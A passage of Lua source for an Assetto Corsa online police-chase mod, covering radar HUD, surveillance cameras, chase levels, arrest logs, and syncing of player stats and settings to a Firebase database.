	arrest = ""https://i.postimg.cc/DwJv2YgM/icon-Arrest.png"",
	cams = ""https://i.postimg.cc/15zRdzNP/iconCams.png"",
	logs = ""https://i.postimg.cc/VNXztr29/iconLogs.png"",
	lost = ""https://i.postimg.cc/DyYf3KqG/iconLost.png"",
	menu = ""https://i.postimg.cc/SxByj71N/iconMenu.png"",
	radar = ""https://i.postimg.cc/4dZsQ4TD/icon-Radar.png"",
}

local cameras = {
	{
		name = ""BOBs SCRAPYARD"",
		pos = vec3(-3564, 31.5, -103),
		dir = -8,
		fov = 60,
	},
	{
		name = ""ARENA"",
		pos = vec3(-2283, 115.5, 3284),
		dir = 128,
		fov = 70,
	},
	{
		name = ""BANK"",
		pos = vec3(-716, 151, 3556.4),
		dir = 12,
		fov = 95,
	},
	{
		name = ""STREET RUNNERS"",
		pos = vec3(-57.3, 103.5, 2935.5),
		dir = 16,
		fov = 67,
	},
	{
		name = ""ROAD CRIMINALS"",
		pos = vec3(-2332, 101.1, 3119.2),
		dir = 121,
		fov = 60,
	},
	{
		name = ""RECKLESS RENEGADES"",
		pos = vec3(-2993.7, -24.4, -601.7),
		dir = -64,
		fov = 60,
	},
	{
		name = ""MOTION MASTERS"",
		pos = vec3(-2120.4, -11.8, -1911.5),
		dir = 102,
		fov = 60,
	},
}

local pursuit = {
	suspect = nil,
	enable = false,
	maxDistance = 250000,
	minDistance = 40000,
	nextMessage = 30,
	level = 1,
	id = -1,
	timerArrest = 0,
	hasArrested = false,
	startedTime = 0,
	timeLostSight = 0,
	lostSight = false,
	engage = false,
}

local arrestations = {}

local textSize = {}

local textPos = {}

local iconPos = {}

local playerData = {}

---------------------------------------------------------------------------------------------- Firebase ----------------------------------------------------------------------------------------------

local urlAppScript = 'https://script.google.com/macros/s/AKfycbwenxjCAbfJA-S90VlV0y7mEH75qt3TuqAmVvlGkx-Y1TX8z5gHtvf5Vb8bOVNOA_9j/exec'
local firebaseUrl = 'https://acp-server-97674-default-rtdb.firebaseio.com/'
local firebaseUrlData = 'https://acp-server-97674-default-rtdb.firebaseio.com/PlayersData/'
local firebaseUrlsettings = 'https://acp-server-97674-default-rtdb.firebaseio.com/Settings'

local function updateSheets()
	local str = '{""category"" : ""Arrestations""}'
	web.post(urlAppScript, str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
		end
	end)
end

local function addPlayerToDataBase()
	local steamID = ac.getUserSteamID()
	local name = ac.getDriverName(0)
	local str = '{""' .. steamID .. '"": {""Name"":""' .. name .. '"",""Getaway"": 0,""Drift"": 0,""Overtake"": 0,""Wins"": 0,""Losses"": 0,""Busted"": 0,""Arrests"": 0,""Theft"": 0}}'
	web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function getFirebase()
	local url = firebaseUrl .. ""Players/"" .. ac.getUserSteamID() .. '.json'
	web.get(url, function(err, response)
		if err then
			print(err)
			return
		else
			if response.body == 'null' then
				addPlayerToDataBase(ac.getUserSteamID())
			else
				local jString = response.body
				playerData = json.parse(jString)
				if playerData.Name ~= ac.getDriverName(0) then
					playerData.Name = ac.getDriverName(0)
				end
			end
			ac.log('Player data loaded')
		end
	end)
end

local function updatefirebase()
	local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(playerData) .. '}'
	web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
		end
	end)
end

local function updatefirebaseData(node, data)
	local str = dataStringify(data)
	web.request('PATCH', firebaseUrlData .. node .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		else
			print(response.body)
			updateSheets()
		end
	end)
end

local function addPlayersettingsToDataBase(steamID)
	local str = '{""' .. steamID .. '"": {""essentialSize"":20,""policeSize"":20,""hudOffsetX"":0,""hudOffsetY"":0,""fontSize"":20,""current"":1,""colorHud"":""1,0,0,1"",""timeMsg"":10,""msgOffsetY"":10,""msgOffsetX"":' .. windowWidth/2 .. ',""fontSizeMSG"":30,""menuPos"":""0,0"",""unit"":""km/h"",""unitMult"":1}}'
	web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function loadsettings()
	local url = firebaseUrlsettings .. ""/"" .. ac.getUserSteamID() .. '.json'
	web.get(url, function(err, response)
		if err then
			print(err)
			return
		else
			if response.body == 'null' then
				addPlayersettingsToDataBase(ac.getUserSteamID())
			else
				ac.log(""settings loaded"")
				local jString = response.body
				local table = json.parse(jString)
				parsesettings(table)
			end
		end
	end)
end

local function updatesettings()
	local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(settingsJSON) .. '}'
	web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
		if err then
			print(err)
			return
		end
	end)
end

local function onsettingsChange()
	settingsJSON.colorHud = rgbmToString(settings.colorHud)
	settingsJSON.menuPos = vec2ToString(settings.menuPos)
	settingsJSON.essentialSize = settings.essentialSize
	settingsJSON.policeSize = settings.policeSize
	settingsJSON.hudOffsetX = settings.hudOffsetX
	settingsJSON.hudOffsetY = settings.hudOffsetY
	settingsJSON.fontSize = settings.fontSize
	settingsJSON.current = settings.current
	settingsJSON.timeMsg = settings.timeMsg
	settingsJSON.msgOffsetY  = settings.msgOffsetY
	settingsJSON.msgOffsetX  = settings.msgOffsetX
	settingsJSON.fontSizeMSG = settings.fontSizeMSG
	settingsJSON.unit = settings.unit
	settingsJSON.unitMult = settings.unitMult
	settingsJSON.starsSize = settings.starsSize
	settingsJSON.starsPos = vec2ToString(settings.starsPos)
	updatesettings()
end

---------------------------------------------------------------------------------------------- settings ----------------------------------------------------------------------------------------------

local acpPolice = ac.OnlineEvent({
    message = ac.StructItem.string(110),
	messageType = ac.StructItem.int16(),
	yourIndex = ac.StructItem.int16(),
}, function (sender, data)
	if data.yourIndex == car.sessionID and data.messageType == 0 and pursuit.suspect ~= nil and sender == pursuit.suspect then
		pursuit.hasArrested = true
		ac.log(""ZHD Police: Police received"")
	end
end)

local starsUI = {
	starsPos = vec2(windowWidth - (settings.starsSize or 20)/2, settings.starsSize or 20)/2,
	starsSize = vec2(windowWidth - (settings.starsSize or 20)*2, (settings.starsSize or 20)*2),
	startSpace = (settings.starsSize or 20)/4,
}

local function resetStarsUI()
	if settings.starsPos == nil then
		settings.starsPos = vec2(windowWidth, 0)
	end
	if settings.starsSize == nil then
		settings.starsSize = 20
	end
	starsUI.starsPos = vec2(settings.starsPos.x - settings.starsSize/2, settings.starsPos.y + settings.starsSize/2)
	starsUI.starsSize = vec2(settings.starsPos.x - settings.starsSize*2, settings.starsPos.y + settings.starsSize*2)
	starsUI.startSpace = settings.starsSize/1.5
end

local function updatePos()
	imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
	iconPos.arrest1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/3.2)
	iconPos.arrest2 = vec2(imageSize.x/1.215, imageSize.y/5)
	iconPos.lost1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/2.35)
	iconPos.lost2 = vec2(imageSize.x/1.215, imageSize.y/3.2)
	iconPos.logs1 = vec2(imageSize.x/1.215, imageSize.y/1.88)
	iconPos.logs2 = vec2(imageSize.x/1.39, imageSize.y/2.35)
	iconPos.menu1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/1.88)
	iconPos.menu2 = vec2(imageSize.x/1.215, imageSize.y/2.35)
	iconPos.cams1 = vec2(imageSize.x/1.215, imageSize.y/2.35)
	iconPos.cams2 = vec2(imageSize.x/1.39, imageSize.y/3.2)

	textSize.size = vec2(imageSize.x*3/5, settings.fontSize/2)
	textSize.box = vec2(imageSize.x*3/5, settings.fontSize/1.3)
	textSize.window1 = vec2(settings.hudOffsetX+imageSize.x/9.5, settings.hudOffsetY+imageSize.y/5.3)
	textSize.window2 = vec2(imageSize.x*3/5, imageSize.y/2.8)

	textPos.box1 = vec2(0, 0)
	textPos.box2 = vec2(textSize.size.x, textSize.size.y*1.8)
	textPos.addBox = vec2(0, textSize.size.y*1.8)
	settings.fontSize = settings.policeSize * fontMultiplier

	resetStarsUI()
end

local function showStarsPursuit()
	local starsColor = rgbm(1, 1, 1, os.clock()%2 + 0.3)
	resetStarsUI()
	for i = 1, 5 do
		if i > pursuit.level/2 then
			ui.drawIcon(ui.Icons.StarEmpty, starsUI.starsPos, starsUI.starsSize, rgbm(1, 1, 1, 0.2))
		else
			ui.drawIcon(ui.Icons.StarFull, starsUI.starsPos, starsUI.starsSize, starsColor)
		end
		starsUI.starsPos.x = starsUI.starsPos.x - settings.starsSize - starsUI.startSpace
		starsUI.starsSize.x = starsUI.starsSize.x - settings.starsSize - starsUI.startSpace
	end
end

local showPreviewMsg = false
local showPreviewStars = false
COLORSMSGBG = rgbm(0.5,0.5,0.5,0.5)

local function initsettings()
	if settings.unit then
		settings.fontSize = settings.policeSize * fontMultiplier
		if settings.unit ~= ""km/h"" then settings.unitMult = 0.621371 end
		settings.policeSize = settings.policeSize * windowHeight/1440
		settings.fontSize = settings.policeSize * windowHeight/1440
		imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
		updatePos()
	end
end

local function previewMSG()
	ui.beginTransparentWindow(""previewMSG"", vec2(0, 0), vec2(windowWidth, windowHeight))
	ui.pushDWriteFont(""Orbitron;Weight=800"")
	local tSize = ui.measureDWriteText(""Messages from Police when being chased"", settings.fontSizeMSG)
	local uiOffsetX = settings.msgOffsetX - tSize.x/2
	local uiOffsetY = settings.msgOffsetY
	ui.drawRectFilled(vec2(uiOffsetX - 5, uiOffsetY-5), vec2(uiOffsetX + tSize.x + 5, uiOffsetY + tSize.y + 5), COLORSMSGBG)
	ui.dwriteDrawText(""Messages from Police when being chased"", settings.fontSizeMSG, vec2(uiOffsetX, uiOffsetY), rgbm.colors.cyan)
	ui.popDWriteFont()
	ui.endTransparentWindow()
end

local function previewStars()
	ui.beginTransparentWindow(""previewStars"", vec2(0, 0), vec2(windowWidth, windowHeight))
	showStarsPursuit()
	ui.endTransparentWindow()
end

local function uiTab()
	ui.text('On Screen Message : ')
	settings.timeMsg = ui.slider('##' .. 'Time Msg On Screen', settings.timeMsg, 1, 15, 'Time Msg On Screen' .. ': %.0fs')
	settings.fontSizeMSG = ui.slider('##' .. 'Font Size MSG', settings.fontSizeMSG, 10, 50, 'Font Size' .. ': %.0f')
	ui.text('Stars : ')
	settings.starsPos.x = ui.slider('##' .. 'Stars Offset X', settings.starsPos.x, 0, windowWidth, 'Stars Offset X' .. ': %.0f')
	settings.starsPos.y = ui.slider('##' .. 'Stars Offset Y', settings.starsPos.y, 0, windowHeight, 'Stars Offset Y' .. ': %.0f')
	settings.starsSize = ui.slider('##' .. 'Stars Size', settings.starsSize, 10, 50, 'Stars Size' .. ': %.0f')
	ui.newLine()
	ui.text('Offset : ')
	settings.msgOffsetY = ui.slider('##' .. 'Msg On Screen Offset Y', settings.msgOffsetY, 0, windowHeight, 'Msg On Screen Offset Y' .. ': %.0f')
	settings.msgOffsetX = ui.slider('##' .. 'Msg On Screen Offset X', settings.msgOffsetX, 0, windowWidth, 'Msg On Screen Offset X' .. ': %.0f')
    ui.newLine()
	ui.text('Preview : ')
	ui.sameLine()
    if ui.button('Message') then
		showPreviewMsg = not showPreviewMsg
		showPreviewStars = false
	end
	ui.sameLine()
	if ui.button('Stars') then
		showPreviewStars = not showPreviewStars
		showPreviewMsg = false
	end
    if showPreviewMsg then previewMSG()
	elseif showPreviewStars then previewStars() end
	if ui.button('Offset X to center') then settings.msgOffsetX = windowWidth/2 end
	ui.newLine()
end

local function settingsWindow()
	imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
	ui.dwriteTextAligned(""settings"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
	ui.newLine(20)
	ui.sameLine(10)
	ui.beginGroup()
	ui.text('Unit : ')
	ui.sameLine(160)
	if ui.selectable('mph', settings.unit == 'mph',_, ui.measureText('km/h')) then
		settings.unit = 'mph'
		settings.unitMult = 0.621371
	end
	ui.sameLine(200)
	if ui.selectable('km/h', settings.unit == 'km/h',_, ui.measureText('km/h')) then
		settings.unit = 'km/h'
		settings.unitMult = 1
	end
	ui.sameLine(windowWidth/6.5 - 120)
	if ui.button('Close', vec2(100, windowHeight/50)) then
		settingsOpen = false
		onsettingsChange()
	end
	ui.text('HUD : ')
	settings.hudOffsetX = ui.slider('##' .. 'HUD Offset X', settings.hudOffsetX, 0, windowWidth, 'HUD Offset X' .. ': %.0f')
	settings.hudOffsetY = ui.slider('##' .. 'HUD Offset Y', settings.hudOffsetY, 0, windowHeight, 'HUD Offset Y' .. ': %.0f')
	settings.policeSize = ui.slider('##' .. 'HUD Size', settings.policeSize, 10, 50, 'HUD Size' .. ': %.0f')
	settings.fontSize = settings.policeSize * fontMultiplier
    ui.setNextItemWidth(300)
    ui.newLine()
    uiTab()
	updatePos()
	ui.endGroup()
end

---------------------------------------------------------------------------------------------- Utils ----------------------------------------------------------------------------------------------

local function formatMessage(message)
	local msgToSend = message
	if pursuit.suspect == nil then
		msgToSend = string.gsub(msgToSend,""`CAR`"", ""No Car"")
		msgToSend = string.gsub(msgToSend,""`NAME`"", ""No Name"")
		msgToSend = string.gsub(msgToSend,""`SPEED`"", ""No Speed"")
		return msgToSend
	end
	msgToSend = string.gsub(msgToSend,""`CAR`"", string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """"))
	msgToSend = string.gsub(msgToSend,""`NAME`"", ""@"" .. ac.getDriverName(pursuit.suspect.index))
	msgToSend = string.gsub(msgToSend,""`SPEED`"", string.format(""%d "", ac.getCarSpeedKmh(pursuit.suspect.index) * settings.unitMult) .. settings.unit)
	return msgToSend
end

---------------------------------------------------------------------------------------------- HUD ----------------------------------------------------------------------------------------------

local policeLightsPos = {
	vec2(0,0),
	vec2(windowWidth/10,windowHeight),
	vec2(windowWidth-windowWidth/10,0),
	vec2(windowWidth,windowHeight)
}

local function showPoliceLights()
	local timing = math.floor(os.clock()*2 % 2)
	if timing == 0 then
		ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(1,0,0,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(1,0,0,0.5))
		ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(0,0,1,0.5), rgbm(0,0,1,0.5), rgbm(0,0,0,0))
	else
		ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(0,0,1,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(0,0,1,0.5))
		ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(1,0,0,0.5), rgbm(1,0,0,0.5), rgbm(0,0,0,0))
	end
end

local chaseLVL = {
	message = """",
	messageTimer = 0,
	color = rgbm(1,1,1,1),
}

local function resetChase()
	pursuit.enable = false
	pursuit.nextMessage = 30
	pursuit.lostSight = false
	pursuit.timeLostSight = 2
end

local function lostSuspect()
	resetChase()
	pursuit.lostSight = false
	pursuit.timeLostSight = 0
	pursuit.level = 1
	ac.sendChatMessage(formatMessage(msgLost.msg[math.random(#msgLost.msg)]))
	pursuit.suspect = nil
	if cspAboveP218 then
		ac.setExtraSwitch(0, false)
	end
end

local iconsColorOn = {
	[1] = rgbm(1,0,0,1),
	[2] = rgbm(1,1,1,1),
	[3] = rgbm(1,1,1,1),
	[4] = rgbm(1,1,1,1),
	[5] = rgbm(1,1,1,1),
	[6] = rgbm(1,1,1,1),
}

local playersInRange = {}

local function drawImage()
	iconsColorOn[2] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[3] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[4] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[5] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[6] = rgbm(0.99,0.99,0.99,1)
	local uiStats = ac.getUI()

	if ui.rectHovered(iconPos.arrest2, iconPos.arrest1) then
		iconsColorOn[2] = rgbm(1,0,0,1)
		if pursuit.suspect and pursuit.suspect.speedKmh < 50 and car.speedKmh < 20 and uiStats.isMouseLeftKeyClicked then
			pursuit.hasArrested = true
		end
	elseif ui.rectHovered(iconPos.cams2, iconPos.cams1) then
		iconsColorOn[3] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if camerasOpen then camerasOpen = false
			else
				camerasOpen = true
				arrestLogsOpen = false
				if settingsOpen then
					onsettingsChange()
					settingsOpen = false
				end
			end
		end
	elseif ui.rectHovered(iconPos.lost2, iconPos.lost1) then
		iconsColorOn[4] = rgbm(1,0,0,1)
		if pursuit.suspect and uiStats.isMouseLeftKeyClicked then
			lostSuspect()
		end
	elseif ui.rectHovered(iconPos.logs2, iconPos.logs1) then
		iconsColorOn[5] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if arrestLogsOpen then arrestLogsOpen = false
			else
				arrestLogsOpen = true
				camerasOpen = false
				if settingsOpen then
					onsettingsChange()
					settingsOpen = false
				end
			end
		end
	elseif ui.rectHovered(iconPos.menu2, iconPos.menu1) then
		iconsColorOn[6] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if settingsOpen then
				onsettingsChange()
				settingsOpen = false
			else
				settingsOpen = true
				arrestLogsOpen = false
				camerasOpen = false
			end
		end
	end
	ui.image(hudImg.base, imageSize, rgbm.colors.white)
	ui.drawImage(hudImg.radar, vec2(0,0), imageSize, iconsColorOn[1])
	ui.drawImage(hudImg.arrest, vec2(0,0), imageSize, iconsColorOn[2])
	ui.drawImage(hudImg.cams, vec2(0,0), imageSize, iconsColorOn[3])
	ui.drawImage(hudImg.lost, vec2(0,0), imageSize, iconsColorOn[4])
	ui.drawImage(hudImg.logs, vec2(0,0), imageSize, iconsColorOn[5])
	ui.drawImage(hudImg.menu, vec2(0,0), imageSize, iconsColorOn[6])
end

local function playerSelected(player)
	if player.speedKmh > 50 then
		pursuit.suspect = player
		pursuit.nextMessage = 30
		pursuit.level = 1
		local msgToSend = ""Officer "" .. ac.getDriverName(0) .. "" is chasing you. Run! ""
		pursuit.startedTime = settings.timeMsg
		pursuit.engage = true
		acpPolice{message = msgToSend, messageType = 0, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
		if cspAboveP218 then
			ac.setExtraSwitch(0, true)
		end
	end
end

local function hudInChase()
	ui.pushDWriteFont(""Orbitron;Weight=Black"")
	ui.sameLine(20)
	ui.beginGroup()
	ui.newLine(1)
	local textPursuit = ""LVL : "" .. math.floor(pursuit.level/2)
	ui.dwriteTextWrapped(ac.getDriverName(pursuit.suspect.index) .. '\n'
						.. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """")
						.. '\n' .. string.format(""Speed: %d "", pursuit.suspect.speedKmh * settings.unitMult) .. settings.unit
						.. '\n' .. textPursuit, settings.fontSize/2, rgbm.colors.white)
	ui.dummy(vec2(imageSize.x/5,imageSize.y/20))
	ui.newLine(30)
	ui.sameLine()
	if ui.button('Cancel Chase', vec2(imageSize.x/5, imageSize.y/20)) then
		lostSuspect()
	end
	ui.endGroup()
	ui.popDWriteFont()
end

local function drawText()
	local uiStats = ac.getUI()
	ui.pushDWriteFont(""Orbitron;Weight=Bold"")
	ui.dwriteDrawText(""RADAR ACTIVE"", settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(""RADAR ACTIVE"", settings.fontSize/2).x)/2, 0), rgbm(1,0,0,1))
	ui.popDWriteFont()
	ui.pushDWriteFont(""Orbitron;Weight=Regular"")
	ui.dwriteDrawText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3, vec2((textPos.box2.x - ui.measureDWriteText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3).x)/2, settings.fontSize/1.5), rgbm(1,0,0,1))

	local colorText = rgbm(1,1,1,1)
	textPos.box1 = vec2(0, textSize.size.y*2.5)
	ui.dummy(vec2(textPos.box2.x,settings.fontSize))
	for i = 1, #playersInRange do
		colorText = rgbm(1,1,1,1)
		ui.drawRect(vec2(textPos.box2.x/9,textPos.box1.y), vec2(textPos.box2.x*8/9, textPos.box1.y + textPos.box2.y), rgbm(1,1,1,0.1), 1)
		if ui.rectHovered(textPos.box1, textPos.box1 + textPos.box2) then
			colorText = rgbm(1,0,0,1)
			if uiStats.isMouseLeftKeyClicked then
				playerSelected(playersInRange[i].player)
			end
		end
		ui.dwriteDrawText(playersInRange[i].text, settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(ac.getDriverName(playersInRange[i].player.index) .. "" - 000 "" .. settings.unit, settings.fontSize/2).x)/2, textPos.box1.y + textSize.size.y/5), colorText)
		textPos.box1 = textPos.box1 + textPos.addBox
		ui.dummy(vec2(textPos.box2.x, i * settings.fontSize/5))
	end
	ui.popDWriteFont()
end

local function radarUI()
	ui.toolWindow('radarText', textSize.window1, textSize.window2, true, function ()
		ui.childWindow('childradar', textSize.window2, true , function ()
			if pursuit.suspect then hudInChase()
			else drawText() end
		end)
	end)
	ui.transparentWindow('radar', vec2(settings.hudOffsetX, settings.hudOffsetY), imageSize, true, function ()
		drawImage()
	end)
end

local function hidePlayers()
	local hideRange = 500
	for i = ac.getSim().carsCount - 1, 0, -1 do
		local player = ac.getCar(i)
		local playerCarID = ac.getCarID(i)
		if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
			if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
				if player.position.x > car.position.x - hideRange and player.position.z > car.position.z - hideRange and player.position.x < car.position.x + hideRange and player.position.z < car.position.z + hideRange then
					ac.hideCarLabels(i, false)
				else
					ac.hideCarLabels(i, true)
				end
			end
		end
	end
end

local function radarUpdate()
	if firstload and not pursuit.suspect then return end
	local radarRange = 250
	local previousSize = #playersInRange

	local j = 1
	for i = ac.getSim().carsCount - 1, 0, -1 do
		local player = ac.getCar(i)
		local playerCarID = ac.getCarID(i)
		if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
			if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
				if player.position.x > car.position.x - radarRange and player.position.z > car.position.z - radarRange and player.position.x < car.position.x + radarRange and player.position.z < car.position.z + radarRange then
					playersInRange[j] = {}
					playersInRange[j].player = player
					playersInRange[j].text = ac.getDriverName(player.index) .. string.format("" - %d "", player.speedKmh * settings.unitMult) .. settings.unit
					j = j + 1
					if j == 9 then break end
				end
			end
		end
	end
	for i = j, previousSize do playersInRange[i] = nil end
end

---------------------------------------------------------------------------------------------- Chase ----------------------------------------------------------------------------------------------

local function inRange()
	local distance_x = pursuit.suspect.position.x - car.position.x
	local distance_z = pursuit.suspect.position.z - car.position.z
	local distanceSquared = distance_x * distance_x + distance_z * distance_z
	if(distanceSquared < pursuit.minDistance) then
		pursuit.enable = true
		pursuit.lostSight = false
		pursuit.timeLostSight = 2
	elseif (distanceSquared < pursuit.maxDistance) then resetChase()
	else
		if not pursuit.lostSight then
			pursuit.lostSight = true
			pursuit.timeLostSight = 2
		else
			pursuit.timeLostSight = pursuit.timeLostSight - ui.deltaTime()
			if pursuit.timeLostSight < 0 then lostSuspect() end
		end
	end
end

local function sendChatToSuspect()
	if pursuit.enable then
		if 0 < pursuit.nextMessage then
			pursuit.nextMessage = pursuit.nextMessage - ui.deltaTime()
		elseif pursuit.nextMessage < 0 then
			local nb = tostring(pursuit.level)
			acpPolice{message = nb, messageType = 1, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
			if pursuit.level < 10 then
				pursuit.level = pursuit.level + 1
				chaseLVL.messageTimer = settings.timeMsg
				chaseLVL.message = ""CHASE LEVEL "" .. math.floor(pursuit.level/2)
				if pursuit.level > 8 then
					chaseLVL.color = rgbm.colors.red
				elseif pursuit.level > 6 then
					chaseLVL.color = rgbm.colors.orange
				elseif pursuit.level > 4 then
					chaseLVL.color = rgbm.colors.yellow
				else
					chaseLVL.color = rgbm.colors.white
				end
			end
			pursuit.nextMessage = 30
		end
	end
end

local function showPursuitMsg()
	local text = """"
	if chaseLVL.messageTimer > 0 then
		chaseLVL.messageTimer = chaseLVL.messageTimer - ui.deltaTime()
		text = chaseLVL.message
	end
	if pursuit.startedTime > 0 then
		if pursuit.suspect then
			text = ""You are chasing "" .. ac.getDriverName(pursuit.suspect.index) .. "" driving a "" .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """") .. "" ! Get him! ""
		end
		if pursuit.startedTime > 6 then showPoliceLights() end
		if pursuit.engage and pursuit.startedTime < 8 then
			ac.sendChatMessage(formatMessage(msgEngage.msg[math.random(#msgEngage.msg)]))
			pursuit.engage = false
		end
	end
	if text ~= """" then
		local textLenght = ui.measureDWriteText(text, settings.fontSizeMSG)
		local rectPos1 = vec2(settings.msgOffsetX - textLenght.x/2, settings.msgOffsetY)
		local rectPos2 = vec2(settings.msgOffsetX + textLenght.x/2, settings.msgOffsetY + settings.fontSizeMSG)
		local rectOffset = vec2(10, 10)
		if ui.time() % 1 < 0.5 then
			ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, COLORSMSGBG, 10)
		else
			ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, rgbm(0,0,0,0.5), 10)
		end
		ui.dwriteDrawText(text, settings.fontSizeMSG, rectPos1, chaseLVL.color)
	end
end

local function arrestSuspect()
	if pursuit.hasArrested and pursuit.suspect then
		local msgToSend = formatMessage(msgArrest.msg[math.random(#msgArrest.msg)])
		table.insert(arrestations, msgToSend .. os.date(""\nDate of the Arrestation: %c""))
		ac.sendChatMessage(msgToSend .. ""\nPlease Get Back Pit, GG!"")
		pursuit.id = pursuit.suspect.sessionID
		if playerData.Arrests == nil then playerData.Arrests = 0 end
		playerData.Arrests = playerData.Arrests + 1
		pursuit.startedTime = 0
		pursuit.suspect = nil
		pursuit.timerArrest = 1
	elseif pursuit.hasArrested then
		if pursuit.timerArrest > 0 then
			pursuit.timerArrest = pursuit.timerArrest - ui.deltaTime()
		else
			acpPolice{message = ""BUSTED!"", messageType = 2, yourIndex = pursuit.id}
			pursuit.timerArrest = 0
			pursuit.suspect = nil
			pursuit.id = -1
			pursuit.hasArrested = false
			pursuit.startedTime = 0
			pursuit.enable = false
			pursuit.level = 1
			pursuit.nextMessage = 20
			pursuit.lostSight = false
			pursuit.timeLostSight = 0
			local data = {
				[""Arrests""] = playerData.Arrests,
			}
			updatefirebase()
			updatefirebaseData(""Arrests"", data)
		end
	end
end

local function chaseUpdate()
	if pursuit.startedTime > 0 then pursuit.startedTime = pursuit.startedTime - ui.deltaTime()
	else pursuit.startedTime = 0 end
	if pursuit.suspect then
		sendChatToSuspect()
		inRange()
	end
	arrestSuspect()
end

---------------------------------------------------------------------------------------------- Menu ----------------------------------------------------------------------------------------------

local function arrestLogsUI()
	ui.dwriteTextAligned(""Arrestation Logs"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/4,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/4,60), rgbm.colors.white, 1)
	ui.newLine(15)
	ui.sameLine(10)
	ui.beginGroup()
	local allMsg = """"
	ui.dwriteText(""Click on the button next to the message you want to copy."", 15, rgbm.colors.white)
	ui.sameLine(windowWidth/4 - 120)
	if ui.button('Close', vec2(100, windowHeight/50)) then arrestLogsOpen = false end
	for i = 1, #arrestations do
		if ui.smallButton(""#"" .. i .. "": "", vec2(0,10)) then
			ui.setClipboardText(arrestations[i])
		end
		ui.sameLine()
		ui.dwriteTextWrapped(arrestations[i], 15, rgbm.colors.white)
	end
	if #arrestations == 0 then
		ui.dwriteText(""No arrestation logs yet."", 15, rgbm.colors.white)
	end
	ui.newLine()
	if ui.button(""Set all messages to ClipBoard"") then
		for i = 1, #arrestations do
			allMsg = allMsg .. arrestations[i] .. ""\n\n""
		end
		ui.setClipboardText(allMsg)
	end
	ui.endGroup()
end

local buttonPos = windowWidth/65

local function camerasUI()
	ui.dwriteTextAligned(""Surveillance Cameras"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
	ui.newLine(20)
	ui.beginGroup()
	ui.sameLine(buttonPos)
	if ui.button('Close', vec2(windowWidth/6.5 - buttonPos*2,30)) then camerasOpen = false end
	ui.newLine()
	for i = 1, #cameras do
		local h = math.rad(cameras[i].dir + ac.getCompassAngle(vec3(0, 0, 1)))
		ui.newLine()
		ui.sameLine(buttonPos)
		if ui.button(cameras[i].name, vec2(windowWidth/6.5 - buttonPos*2,30)) then
			ac.setCurrentCamera(ac.CameraMode.Free)
			ac.setCameraPosition(cameras[i].pos)
			ac.setCameraDirection(vec3(math.sin(h), 0, math.cos(h))) 
			ac.setCameraFOV(cameras[i].fov)
		end
	end
	if ac.getSim().cameraMode == ac.CameraMode.Free then
		ui.newLine()
		ui.newLine()
		ui.sameLine(buttonPos)
        if ui.button('Police car camera', vec2(windowWidth/6.5 - buttonPos*2,30)) then ac.setCurrentCamera(ac.CameraMode.Cockpit) end
    end
end


local initialized = false
local menuSize = {vec2(windowWidth/4, windowHeight/3), vec2(windowWidth/6.4, windowHeight/2.2)}
local buttonPressed = false

local function moveMenu()
